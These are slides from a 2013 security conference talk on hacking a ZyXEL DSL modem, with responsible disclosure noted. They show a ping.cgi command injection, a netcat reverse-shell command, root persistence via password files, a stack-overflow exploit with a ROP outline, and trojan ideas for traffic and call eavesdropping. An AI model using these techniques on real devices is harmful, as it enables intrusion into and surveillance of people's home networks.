HOW I MET YOUR MODEM
EXPLOIT & TROJAN DEV FOR CONSUMER DSL DEVICES
HACK IN THE BOX 2013 AMSTERDAM - PETER GEISSLER & STEVEN KETELAAR
Thursday, April 11, 13

WHO ARE WE?
Thursday, April 11, 13

STEVEN
· Software developer · Security fanatic · Produces dance music · Eindbazen CTF
Thursday, April 11, 13

PETER
· Developer during day · Hacker at night · Worked on Homebrew Channel · Hack In The Box CTF
Thursday, April 11, 13

INTRODUCTION
· What is a DSL modem? · Why should we care about them? · Why did we do this research?
Thursday, April 11, 13

ZYXEL
Interfaces on a typical ZyXEL modem
Thursday, April 11, 13

THE MODEM WE HACKED
ZyXEL P-2601HN-F1
Thursday, April 11, 13

BASIC FEATURES
· Routing DSL traffic · Network Address Translation · Voice over IP Telephony · Management through HTTP, telnet/SSH · Protects you from the Internet (firewall)
Thursday, April 11, 13

REGULAR NETWORK SETUP
Thursday, April 11, 13

OUR TEST NETWORK SETUP
Thursday, April 11, 13

HITB NETWORK SETUP
Thursday, April 11, 13

ZYXEL MANAGEMENT INTERFACES
Thursday, April 11, 13

LOCAL MANAGEMENT - SSH/TELNET
ZyShell A limited shell that allows to control
modem specific functionality
Thursday, April 11, 13

LOCAL MANAGEMENT - HTTP
Welcome screen shows all connected devices
Thursday, April 11, 13

PING.CGI
Diagnostic utility provided by the Zyxel webinterface

Thursday, April 11, 13

Ping utility output looks familiar to the Linux ping command

PING.CGI - OWNED
Using a semicolon allows us to enter shell commands:

· ;id;

uid=0(root) gid=0(root)

Thursday, April 11, 13

PING.CGI - OVERVIEW
· Arbitrary command execution · Input is not filtered in any way · Length of command limited (max 36 chars) · Command runs as root (uid=0) · Connectback shell is possible
Thursday, April 11, 13

PING.CGI - EXPLOIT
We wrote an ugly bash script to execute commands on the Zyxel
· Authenticates against the device (login.cgi) · Executes the command and filters the output · Easy to use tool to enter a command and see the output
Thursday, April 11, 13

PING.CGI - EXPLOIT EXAMPLE
· Executing our shellscript · cmd = nc 192.168.1.69 6 -e sh
Spawns a shell at our listener
Thursday, April 11, 13

DEMO TIME - LOCAL EXPLOIT
Thursday, April 11, 13

PERSISTENT SHELL
· Replacing /etc/passwd to update home folder of `admin' user to break out of ZySHELL jail
· Replacing /etc/shadow hash for root user to be able to `su' to root
· Now we can just SSH into the modem
Thursday, April 11, 13

LOCAL BUG CONCLUSION
· Requires credentials/access to admin interface
· Requires access to LAN (by default) · Yields root privileges :-)
Thursday, April 11, 13

REMOTE MANAGEMENT
Thursday, April 11, 13

TR-069
"TR-069 (Technical Report 069) is a DSL Forum (which was later renamed as Broadband Forum) technical specification entitled CPE WAN Management Protocol (CWMP). It defines an application layer protocol for remote management of end-user devices."
Thursday, April 11, 13

TR-069 - OVERVIEW
· CWMP Protocol · Used for provisioning and configuration
deployment
· CPE: Customer Premise Equipment · ACS:Auto Configuration Server
Thursday, April 11, 13

TR-069 on ZYXEL - ZYTR069
· HTTP Daemon listening on TCP port 7676 · Uses ZyXEL-RomPager/4.34 · Accessible from any WAN connected host · Requires (HTTP Digest) authentication to do
anything useful
Thursday, April 11, 13

ZYTR069 Files
· /usr/sbin/zytr069main · /usr/sbin/zytr069cmd · /usr/lib/librompager.so · /var/S2_97Process · /var/pdm/config.xml
Thursday, April 11, 13

ZYTR069 CONFIGURATION
config.xml
Thursday, April 11, 13

ZYTR069 URI's
· /CWMP/ConnectionRequest · /UE/FormDisplay · /UE/ProcessForm · /UE/...
Thursday, April 11, 13

ZYTR069 User Exit Form

/UE/FormDisplay

/UE/ProcessForm

Thursday, April 11, 13

librompager.so test page for POST data

/UE/ProcessForm DoS
· More than ~50 characters of user input crashes zytr069main
· Effectively manages a ZyXEL modem unmanagable (Denial of Service)
· Might also potentially allow arbitrary code execution..
Thursday, April 11, 13

IDA TIME!
Thursday, April 11, 13

VULNERABILITY DETAILS
· handle_processForm (0x63448) is responsible for handling POST requests to the test form
· invokes RpGetFormItem() with a destination buffer on the stack of a fixed size (48 bytes)
· RpGetFormItem doesn't do any boundschecking and writes past end of buffer.
· Classic stack based buffer overflow.
Thursday, April 11, 13

ROMPAGER CODING PRACTICES
--- 8< ----- *SNIP SNIP* ----- 8< ---
Thursday, April 11, 13

ROMPAGER HTTPD
http://internetcensus2012.bitbucket.org/paper.html
Thursday, April 11, 13

BUILDING A MIPS TOOLCHAIN
· It would be nice if we could easily assemble/ compile shellcode and binaries for target.
· Some debugging tools like gdb(server) would also be nice..
· Compiling gcc, binutils, libc manually.. ? :( · buildroot to the rescue! · $ make menuconfig && make install · up and running with relative ease within an
Thursday, April 11, 13

$PC = 0xBADC0DED

# gdb -q /usr/sbin/zytr069main Reading symbols from /usr/sbin/zytr069main...done. Disconnect Service Server Disconnect Service Server

Program received signal SIGBUS, Bus error.

0x42424242 in ?? ()

(gdb) i r

zero

at

v0

v1

a0

a1

a2

a3

R0 00000000 00000001 000000de 2abb74f4 2abb74f0 2abb7414 80808080 fefefeff

t0

t1

t2

t3

t4

t5

t6

t7

R8 00000020 20202020 6100636f 00000004 742d6c65 00000010 00000010 2ab38304

s0

s1

s2

s3

s4

s5

s6

s7

R16 41414141 41414141 2afc95c8 2afecd34 42424242 42424242 00000001 7fcc6ca4

t8

t9

k0

k1

gp

sp

s8

ra

R24 0000025b 2adf9490 00000000 00000000 2abbdec0 7fcc6af0 7fcc6ca0 42424242

status

lo

hi badvaddr cause

pc

0100fc13 19999999 00000005 42424242 10800010 42424242

fcsr

fir restart

00000000 00000000 00000000

Thursday, April 11, 13

:D-]-<

WRITING AN EXPLOIT
· Buffer layout ["A"x48][ $PC ] · Use of basic Return Oriented Programming
techniques to bypass separated data/ instruction caches.
· Eventually runs own code (shellcode) to get interactive remote root shell
Thursday, April 11, 13

MIPS ROP
· MIPS ROP is kind of awkward · Separate I- and D-Cache.We need to work
around cache incoherency
· sleep() is a good way to force a contextswitch to happen and sync the CPU cache
· Stack is executable so we only need a minimal ROP chain before returning into shellcode. No ASLR either!
· instruction after branch or jump is always executed first
Thursday, April 11, 13

MIPS ROP - GADGETS PART I
set arg for sleep set t9 = s1 jump to gadget 2
set t9 = s1 = gadget 2 set s1 = sleep jump to gadget 2
set ra = gadget 3

Thursday, April 11, 13

jump to sleep

MIPS ROP - GADGETS PART II
set ra = gadget 4 set s1 = gadget 5 jump to gadget 4

Thursday, April 11, 13

set a1 = sp+184 jump to shellcode

POPPIN' A SHELL - DEMO
Thursday, April 11, 13

RESPONSIBLE DISCLOSURE
· Contacted KPN CERT Team · New firmware rolled out · Visited for verification · Everyone happy
Thursday, April 11, 13

LET'S BUILD TROJANS/SPYWARE!
FOR DSL MODEMS
Thursday, April 11, 13

LIVE HTTP SNOOPING
· Build libpcap for MIPS · Add minimal HTTP request parser · ??? · PROFIT!
Thursday, April 11, 13

VOICE CALL EAVESDROPPING
Thursday, April 11, 13

VOICE CALL EAVESDROPPING - PART II
· VoIPong - http://www.enderunix.org/voipong/ · Not directly suitable for embedded trojan
use.. :-(
· But with some minimal modifications, it is! :-)
Thursday, April 11, 13

VOICE SNOOPING DEMO
Thursday, April 11, 13

TONS OF MORE "FUN"
· We won't focus on C&C right now.. · It's just Linux(tm) · IPTables rocks! · SSLStrip is heavy.. · DDoS? · Expensive outbound calls
Thursday, April 11, 13

THE BOTNET AUCTION BEGINS!

Thursday, April 11, 13

STARTING BID: $ 31337

CONCLUSION
· Consumer DSL devices are a viable target · Oldskool bugs inside of a black box · More focus on the security of these types of
devices is nescessary.
· A different architecture or obscure software won't stop a real hacker! ;-)
Thursday, April 11, 13

THANKS FOR LISTENING! QUESTIONS?
GITHUB.COM/BLASTY/HIMYM.GIT
Thursday, April 11, 13

